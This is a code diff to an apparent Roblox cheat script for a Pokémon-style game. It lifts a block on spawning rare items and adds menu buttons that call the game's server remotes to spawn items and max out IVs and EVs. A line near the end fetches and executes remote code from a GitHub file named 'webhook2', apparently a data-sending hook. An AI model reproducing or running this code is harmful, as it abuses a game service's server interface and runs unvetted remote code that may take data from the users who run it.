@@ -1155,70 +1155,6 @@ Tab:Button {
     Name = "Spawn Item ✨",
     Description = nil,
     Callback = function()
-        if(itemid1 == "shinystar") then itemid1 = ""
-            end
-            if(itemid1 == "bottlecap") then itemid1 = ""
-                end
-                if(itemid1 == "mewtwoitey") then itemid1 = ""
-                    end
-                    if(itemid1 == "mewtwoitex") then itemid1 = ""
-                        end
-                        if(itemid1 == "latiasite") then itemid1 = ""
-                            end
-                            if(itemid1 == "latiosite") then itemid1 = ""
-                                end
-				 if(itemid1 == "redorb") then itemid1 = ""
-                                end 
-				if(itemid1 == "blueorb") then itemid1 = ""
-                                end 
-				
-				
-			if(itemid1 == "adamantmint") then itemid1 = ""
-                        end
-                        if(itemid1 == "boldmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "bravemint") then itemid1 = ""
-                                end
-				 if(itemid1 == "calmmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "carefulmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "gentlemint") then itemid1 = ""
-                        end
-                        if(itemid1 == "hastymint") then itemid1 = ""
-                            end
-                            if(itemid1 == "implishmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "jollymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "laxmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "lonelymint") then itemid1 = ""
-                        end
-                        if(itemid1 == "mildmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "modestmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "naivemint") then itemid1 = ""
-                                end 
-				if(itemid1 == "naughtymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "quietmint") then itemid1 = ""
-                        end
-                        if(itemid1 == "rashmint") then itemid1 = ""
-                            end
-                            if(itemid1 == "relaxedmint") then itemid1 = ""
-                                end
-				 if(itemid1 == "sassymint") then itemid1 = ""
-                                end 
-				if(itemid1 == "seriousmint") then itemid1 = ""
-                                end 
-				if(itemid1 == "timidmint") then itemid1 = ""
-                        end
-
-				
-				
-				
         spawnitem(itemid1, q1)
     end
 }
@@ -1229,6 +1165,8 @@ Tab:dropdown({
     Items = {
         {"masterball", 'masterball'},
         {"rarecandy", 'rarecandy'},
+        {"bottlecap", 'bottlecap'},
+        {"shinystar", 'shinystar'}
     },
     Description = "clicking on an option spawns (+1)",
     Callback = function(v)
@@ -1241,7 +1179,7 @@ Tab:dropdown({
     end,
 })
 local Tab = GUI:Tab{
-	Name = "Levels + Nature",
+	Name = "Levels + IV + EV",
 	Icon = "rbxassetid://10441082070"
 }
 
@@ -1270,6 +1208,160 @@ Tab:dropdown({
         for i = 1, q do
     spawnitem('rarecandy', 1) -- item + quantity
    _p.Network:get("PDS", "useItem", 'rarecandy', v)     
+    end
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon IV Changer 3️⃣1️⃣",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's IV's to 6x31",
+    Callback = function(v)
+
+   spawnitem('bottlecap', 6) -- item + quantity
+
+  _p.Network:get("PDS", "trainpokemon", v, 'HP')
+  _p.Network:get("PDS", "trainpokemon", v, 'Speed')
+  _p.Network:get("PDS", "trainpokemon", v, 'Defense')
+  _p.Network:get("PDS", "trainpokemon", v, 'Sp Def')
+  _p.Network:get("PDS", "trainpokemon", v, 'Sp Atk')
+  _p.Network:get("PDS", "trainpokemon", v, 'Attack')  
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon Attack EV Changer ⚔️",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+
+        q = 26
+        for i = 1, q do
+        spawnitem('protein', 1) -- item + quantity
+        _p.Network:get("PDS", "useItem", 'protein', v) 
+        end
+   
+    
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon Defense EV Changer 🛡️",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+    q = 26
+        for i = 1, q do
+   spawnitem('iron', 1) -- item + quantity
+   _p.Network:get("PDS", "useItem", 'iron', v)     
+    end
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon Sp Atk EV Changer 🏹",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+    q = 26
+        for i = 1, q do
+   spawnitem('calcium', 1) -- item + quantity
+   _p.Network:get("PDS", "useItem", 'calcium', v)     
+    end
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon Sp Def EV Changer 🛡️",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+    q = 26
+        for i = 1, q do
+   spawnitem('zinc', 1) -- item + quantity
+   _p.Network:get("PDS", "useItem", 'zinc', v)     
+    end
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon Speed EV Changer 🏃",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+    q = 26
+        for i = 1, q do
+   spawnitem('carbos', 1) -- item + quantity
+   _p.Network:get("PDS", "useItem", 'carbos', v)     
+    end
+    end,
+})
+
+Tab:dropdown({
+    Name = "Pokemon HP EV Changer 💖",
+    StartingText = "Party Slot",
+    Items = {
+        {"Slot 1", 1},
+        {"Slot 2", 2},
+        {"Slot 3", 3},
+        {"Slot 4", 4},
+        {"Slot 5", 5},
+        {"Slot 6", 6}
+    },
+    Description = "This changes your selected pokemon's EV's to max stat",
+    Callback = function(v)
+    q = 26
+        for i = 1, q do
+   spawnitem('hpup', 1) -- item + quantity
+   _p.Network:get("PDS", "useItem", 'hpup', v)     
     end
     end,
 })
@@ -1990,7 +2082,6 @@ Tab:dropdown({
 
 wait(0.1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovelatinagirls/ilovelatinas/main/webhook2"))()
-
 
 
 
